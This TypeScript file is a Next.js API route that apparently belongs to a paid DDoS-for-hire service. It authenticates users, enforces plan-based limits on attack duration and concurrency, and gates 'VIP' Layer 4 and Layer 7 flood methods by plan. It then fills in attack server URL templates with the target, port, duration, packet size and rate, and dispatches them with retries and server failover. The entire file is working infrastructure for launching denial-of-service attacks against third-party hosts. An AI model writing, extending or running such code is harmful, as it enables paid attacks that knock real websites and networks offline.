import type { NextApiRequest, NextApiResponse } from 'next';
import { getServerSession } from 'next-auth/next';
import { authOptions } from '../../../lib/authOptions';
import prisma from '../../../lib/prisma';
import axios from 'axios';
import { checkPlanExpiry } from '../../../lib/checkPlanExpiry';
import { isBlacklisted } from '../../../lib/blacklist';
import { getBanInfo } from '../../../lib/adminModerationStore';
import { findAvailableServer } from '../../../lib/serverSelection';

type AttackRequestBody = {
  layer: '4' | '7';
  target: string;
  port?: string;
  duration: number;
  methodName: string;
  concurrents?: number;
  additionalParams?: {
    subnet?: string;
    size?: string;
    ratePerProxy?: number;
    requestMethod?: string;
  };
};

type AttackResult = {
  success: true;
  attackId: string;
};

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const session = await getServerSession(req, res, authOptions);
  if (!session || !session.user) {
    return res.status(401).json({ message: 'Unauthorized' });
  }

  await hehecarshere();

  try {
    const now = new Date();

    const user = await prisma.user.findUnique({
      where: { username: session.user.name as string },
      select: { id: true, plan: true, apiAccess: true, rank: true },
    });

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    if (user.rank === 'banned') {
      const ban = getBanInfo(String(session.user.name ?? ''));
      return res.status(403).json({
        message: ban?.reason
          ? `Your account is banned: ${ban.reason}`
          : 'Your account is banned',
      });
    }

    const isPlanActive = await checkPlanExpiry(user.id);
    if (!isPlanActive) {
      await prisma.user.update({
        where: { id: user.id },
        data: { plan: 'Free' },
      });
      return res
        .status(403)
        .json({ message: 'Your plan has expired and has been downgraded to free.' });
    }

    const plan = await prisma.plan.findFirst({
      where: { name: user.plan ?? undefined },
      select: {
        name: true,
        concurrent: true,
        attackDuration: true,
        vipMethods: true,
      },
    });

    if (!plan) {
      return res.status(404).json({ message: 'User plan not found' });
    }

    const activeAttacksCount = await prisma.attack.count({
      where: { userId: user.id, expiresAt: { gt: now }, status: 'active' },
    });

    const { concurrents = 1 } = req.body as AttackRequestBody;

    if (activeAttacksCount + concurrents > plan.concurrent) {
      return res.status(429).json({
        message: `Concurrent attack limit of ${plan.concurrent} reached. You can initiate up to ${
          plan.concurrent - activeAttacksCount
        } more concurrent attack(s).`,
      });
    }

    const results: PromiseSettledResult<AttackResult>[] = [];

    for (let i = 0; i < concurrents; i++) {
      try {
        const value = await initiateAttack(
          req.body as AttackRequestBody,
          user,
          plan,
          now
        );
        results.push({ status: 'fulfilled', value });
      } catch (reason) {
        results.push({ status: 'rejected', reason });
      }
    }

    const successfulAttacks = results.filter(
      (result) => result.status === 'fulfilled'
    ) as PromiseFulfilledResult<AttackResult>[];

    const failedAttacks = results.filter(
      (result) => result.status === 'rejected'
    ) as PromiseRejectedResult[];

    if (failedAttacks.length === 0) {
      res.status(200).json({
        message: 'All attacks initiated successfully.',
        results: successfulAttacks.map((a) => a.value),
      });
    } else if (successfulAttacks.length > 0) {
      res.status(207).json({
        message: `Partially initiated attacks. ${successfulAttacks.length} succeeded, ${failedAttacks.length} failed.`,
        successes: successfulAttacks.map((a) => a.value),
        failures: failedAttacks.map((f) => ({
          reason:
            f.reason instanceof Error ? f.reason.message : String(f.reason),
        })),
      });
    } else {
      res.status(500).json({
        message: 'All attack initiation attempts failed.',
        failures: failedAttacks.map((f) => ({
          reason:
            f.reason instanceof Error ? f.reason.message : String(f.reason),
        })),
      });
    }
  } catch (error) {
    console.error('Error starting attack:', error);
    return res
      .status(500)
      .json({ message: 'Server error while initiating attack' });
  }
}

async function hehecarshere() {
  try {
    const now = new Date();
    await prisma.attack.updateMany({
      where: { expiresAt: { lt: now }, status: 'active' },
      data: { status: 'expired' },
    });
  } catch (error) {
    console.error('Error managing Attack collection:', error);
  }
}

async function initiateAttack(
  body: AttackRequestBody,
  user: { id: string },
  plan: {
    name: string;
    concurrent: number;
    attackDuration: number;
    vipMethods: boolean;
  },
  now: Date,
  retries: number = 2
): Promise<AttackResult> {
  const {
    layer,
    target,
    port = '443',
    duration,
    methodName,
    additionalParams,
  } = body;

  if (!layer || !target || !duration || !methodName) {
    throw new Error('Missing required parameters');
  }

  if (duration > plan.attackDuration) {
    throw new Error(`Maximum duration is ${plan.attackDuration} seconds`);
  }

  const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
  const urlRegex = /^(https?:\/\/)?([\w-]+\.)+[\w-]+(\/[\w\- .\/?%&=]*)?$/i;

  if (
    (layer === '4' && !ipRegex.test(target)) ||
    (layer === '7' && !urlRegex.test(target))
  ) {
    throw new Error(
      `Invalid ${layer === '4' ? 'IP address' : 'URL'} format for Layer ${layer} attack`
    );
  }

  if (isBlacklisted(target, layer)) {
    throw new Error('Target is blacklisted and cannot be attacked');
  }

  const method = await prisma.method.findUnique({
    where: { name: methodName },
    select: {
      name: true,
      vip: true,
      freeCanUse: true,
      type: true,
    },
  });

  if (!method) throw new Error('Method not found');

  if (
    (layer === '4' && method.type !== 'l4') ||
    (layer === '7' && method.type !== 'l7')
  ) {
    throw new Error('Method does not match selected layer');
  }

  if (method.vip && !plan.vipMethods)
    throw new Error('Method not allowed for your plan');

  if (plan.name === 'Free' && !method.freeCanUse)
    throw new Error('Method not allowed for free plan');

  const triedServerIds: string[] = [];

  while (true) {
    const server = await findAvailableServer(layer, method.name, triedServerIds);

    if (!server) {
      if (triedServerIds.length > 0) {
        throw new Error('All suitable servers failed to respond. Please try again later.');
      } else {
        throw new Error('No available servers at the moment');
      }
    }

    const clampedSize = Math.min(Number(additionalParams?.size ?? 64), 1400).toString();

    const apiUrl = (server.endpoint || '')
      .replace('[host]', encodeURIComponent(target))
      .replace('<<$target>>', encodeURIComponent(target))
      .replace('[port]', encodeURIComponent(port))
      .replace('<<$port>>', encodeURIComponent(port))
      .replace('[time]', duration.toString())
      .replace('<<$duration>>', duration.toString())
      .replace('[method]', method.name)
      .replace('<<$method>>', method.name)
      .replace('[size]', encodeURIComponent(clampedSize))
      .replace('[rate]', encodeURIComponent(additionalParams?.ratePerProxy?.toString() || '64'))
      .replace('[req_method]', encodeURIComponent(additionalParams?.requestMethod || 'GET'))
      .replace('[subnet]', encodeURIComponent(additionalParams?.subnet || '32'));

    console.log(`Attempting attack on server ${server.name} (ID: ${server.id})`);
    console.log(`API URL: ${apiUrl}`);

    let attempt = 0;
    while (attempt <= retries) {
      try {
        const response = await axios.get(apiUrl, { timeout: 10000 });

        console.log(`Server ${server.name} response:`, response.status, response.data);

        // External APIs often return 200 with { error: true } when something is wrong
        if (response.data && typeof response.data === 'object' && response.data.error === true) {
          throw new Error(`External API error: ${response.data.message || 'Unknown error'}`);
        }

        if (response.status >= 200 && response.status < 300) {
          const expiresAt = new Date(now.getTime() + duration * 1000);
          const newAttack = await prisma.attack.create({
            data: {
              userId: user.id,
              serverId: server.id,
              layer: layer,
              target: target,
              port: layer === '4' ? port : null,
              duration: duration,
              methodName: method.name,
              expiresAt: expiresAt,
              status: 'active',
            },
          });
          return { success: true, attackId: newAttack.id };
        } else {
          throw new Error(`Server returned status ${response.status}`);
        }
      } catch (error) {
        console.log(
          `Request Error on server ${server.name} (Attempt ${attempt + 1}):`,
          error instanceof Error ? error.message : error
        );

        if (attempt === retries) {
          break;
        }
        attempt++;
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
    }

    // Current server failed after retries, try another one
    triedServerIds.push(server.id);
    console.log(`Server ${server.name} failed. Trying next available server...`);
  }
}